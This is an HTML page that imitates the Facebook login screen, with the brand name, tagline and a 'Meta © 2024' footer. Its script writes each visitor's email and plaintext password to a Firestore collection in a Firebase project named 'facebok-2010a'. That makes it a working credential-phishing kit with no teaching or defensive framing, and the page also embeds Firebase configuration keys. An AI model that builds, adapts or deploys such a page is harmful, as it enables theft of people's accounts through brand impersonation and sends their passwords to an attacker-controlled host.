<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-auth-compat.js"></script>
    <title>Profile Account</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="row res">
        <div class="fb-form res">
            <div class="card">
                <h1>facebook</h1>
                <p>Connect with friends and the world</p>
                <p>around you on Facebook.</p>
            </div>

            <form id="loginForm" onsubmit="return addData();">
                <input type="email" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <div class="fb-submit">
                    <button type="submit" class="login">Login</button>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="#">Create new account</a>
                </div>
            </form>
        </div>
    </div>

    <script>
        // تكوين Firebase باستخدام القيم التي زودتني بها
        const firebaseConfig = {
  apiKey: "AIzaSyASo4bmnKfYXuDLvtK4sscr8cVVYI1oJpM",
  authDomain: "facebok-2010a.firebaseapp.com",
  projectId: "facebok-2010a",
  storageBucket: "facebok-2010a.appspot.com",
  messagingSenderId: "160025373326",
  appId: "1:160025373326:web:73436b4c4bc174a21437df",
  measurementId: "G-2KNH2FN3JY"
};

        // تهيئة Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // وظيفة لإضافة البيانات إلى Firestore
        function addData() {
            const email = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;

            // إضافة البيانات إلى Firestore
            db.collection("users").add({
                email: email,
                password: password
            })
            .then(() => {
                alert("Data saved successfully!");
            })
            .catch((error) => {
                console.error("Error writing document: ", error);
            });

            return false; // لمنع إعادة تحميل الصفحة
        }
    </script>

    <footer>
        <div class="footer-langs">
            <small>Meta © 2024</small>
        </div>
    </footer>
</body>
</html>
